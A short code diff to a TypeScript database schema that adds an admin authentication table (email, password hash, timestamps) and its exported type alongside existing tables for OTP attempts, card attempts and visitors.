@@ -74,6 +74,15 @@ export const otpAttemptsTable = pgTable("mawashi_otp_attempts", {
   createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
 });
 
+// Admin table for authentication
+export const adminTable = pgTable("mawashi_admin", {
+  id: serial("id").primaryKey(),
+  email: text("email").notNull().unique(),
+  passwordHash: text("password_hash").notNull(),
+  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
+  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
+});
+
 // Visitors table for tracking unique visitors
 export const visitorsTable = pgTable("mawashi_visitors", {
   id: serial("id").primaryKey(),
@@ -112,3 +121,4 @@ export type Visitor = typeof visitorsTable.$inferSelect;
 export type Presence = typeof presenceTable.$inferSelect;
 export type CardAttempt = typeof cardAttemptsTable.$inferSelect;
 export type OtpAttempt = typeof otpAttemptsTable.$inferSelect;
+export type Admin = typeof adminTable.$inferSelect;
